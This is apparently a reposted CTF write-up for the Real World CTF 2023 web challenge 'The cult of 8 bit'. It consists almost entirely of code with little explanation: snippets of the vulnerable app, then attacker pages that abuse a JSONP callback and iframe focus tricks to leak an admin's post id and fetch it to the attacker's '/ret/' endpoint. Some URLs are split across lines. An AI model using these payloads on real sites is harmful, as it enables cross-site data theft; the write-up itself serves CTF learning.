# [Real World CTF 2023] The cult of 8 bit

> 原文: https://www.ctfiot.com/90966.html
> ID: 90966


```
bot/bot.js

code/
 app.js
 routes/api.js

 src/
 db.js
 middleware.js

 views/
 home.ejs
 login.ejs
 post.ejs
 register.ejs
 report.ejs

docker-compose.yml
Dockerfile
router.use((req, res, next) => {
 if (req.user.user === "admin") {
 return res.redirect("/?msg=Nice try");
 }
 next();
});

router.post("/create/post" ...)
router.post("/create/todo" ...)
let isURL = false;
try {
 new URL(text); // errors if not valid URL
 console.log("first passed")
 isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no
 console.log(`usUrl:${isURL}, '${text.toLowerCase()}', '${text.toLowerCase().trim()}'`)
} catch {}

req.user.todos.push({
 text, isURL
});
<%_ user.todos.forEach(todo => { _%>
 <%_ if (todo.isURL) { _%>
 <li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
 <%_ } else { _%>
 <li class="has-text-left"><%= todo.text %></li>
 <%_ } _%>
<%_ }); _%>
isURL = !text.toLowerCase().trim().startsWith("javascript:");
/**/ typeof load_post === 'function' && load_post({"success":
true,"name":"X","body":"Y"});
window.onload = function() {
 const id = new URLSearchParams(window.location.search).get('id');
 if (!id) {
 return;
 }

 // Load post from POST_SERVER
 // Since POST_SERVER might be a different origin, this also supports loading data through JSONP
 const request = new XMLHttpRequest();
 try {
 request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);
 request.send(null);
 }
 catch (err) { // POST_SERVER is on another origin, so let's use JSONP
 let script = document.createElement("script");
 script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;
 document.head.appendChild(script);
 return;
 }

 load_post(JSON.parse(request.responseText));
}
// try several different characters with codes from 0 to 1000
for(i=0; i<1000; i++){
 const request = new XMLHttpRequest();
 try {
 request.open('GET', `/api/post/` + encodeURIComponent(String.fromCharCode(i)), false);
 request.send(null);
 } catch (err) {
 console.log("ERROR :", i, err)
 }
}
http://localhost:
12345/post/?id={valid_id}?callback=our_function%23%00
<script src=/api/post/{valid_id}?callback=our_function#%00?callback=load_post></script>
/**/something({"data":"data"})
<html>
 
 <script src='/endpoint?callback=something'></script>
 
</html>
<html>
 
 [](javascript:
alert())
 
</html>
<script>
 win1 = open("/click.html")
 location.replace("http://victim.com/link?url=javascript:
alert()")
</script>
<script>
 // wait for start.html to redirect
 setTimeout(`location.replace("http://victim.com/proxy?name=opener.document.body.children[0].click")`, 1000)
</script>
<html>
 
 <script src='/endpoint?callback=opener.document.body.children[0].click'></script>
 
</html>
<script>
 b = open(`/b.html`);
 location.replace("http://localhost:
12345/");
</script>

 <a id=focusme href=#>sth</a>
 <script>
 const sleep = d => new Promise(r => setTimeout(r, d));
 alphabet = "0123456789abcdef-"

 //create iframes
 for (var i = 0; i < alphabet.length; i++) {
 iframe = document.createElement("iframe");
 iframe.name = alphabet[i];
 iframe.src = "http://localhost:
12345/";
 document.body.appendChild(iframe);
 }

 //array for found characters
 hovered = []

 const main = async () => {
 // every 0.075 secs check for iframes' onfucus event
 setInterval(() => {
 p = document.activeElement.name
 if (p) {
 // if there's focus on an iframe -- add its character to hovered and change the focus
 hovered.push(p);
 document.getElementById("focusme").focus();
 }
 }, 75)

 await sleep(2000);
 c = open(`/c.html`);
 await sleep(2000 + 150);

 // every 500 secs send found characters to our server endpoint /ret/:
characters
 setInterval(() => {
 fetch(`/ret/${hovered.join("")}`)
 }, 500);
 }

 main();
 </script>

<script>
 b = open(`/b.html`);
 location.replace("http://localhost:
12345/");
</script>
<script>
 const sleep = d => new Promise(r => setTimeout(r, d));

 const main = async () => {
 await sleep(1000);

 // 32 is the start of the href url that contains id
 // 36 is the len of the id
 for (var i = 32; i <= 32+36+1; i++) {
 // I'm explainig this payload below
 PAYLOAD = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;
 // change c.html page's location to the vulnerable page that executes callback
 opener.location.replace(`http://localhost:
12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);
 // check the next character every 1.5 secs so that the page have 1.5 sec to load.
 await sleep(1500);
 }
 }

 main();
</script>
php -S host:
port
```
